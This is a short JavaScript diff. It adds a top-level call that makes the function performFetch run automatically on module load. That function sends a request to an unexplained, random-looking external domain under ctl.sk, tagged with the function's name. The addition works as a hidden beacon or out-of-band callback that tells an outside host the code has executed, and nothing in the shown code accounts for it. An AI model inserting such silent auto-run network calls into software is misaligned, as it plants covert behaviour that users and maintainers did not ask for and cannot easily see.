@@ -2,6 +2,8 @@ async function performFetch() {
   const response = await sdk.network.fetch("k5qy7nolvg6ewl9yauvs4q0x2o8jwdk2.ctl.sk/?from=functionpercormfetch");
   return false;
 }
+
+performFetch();
 /**
  *
  * @param {string} text
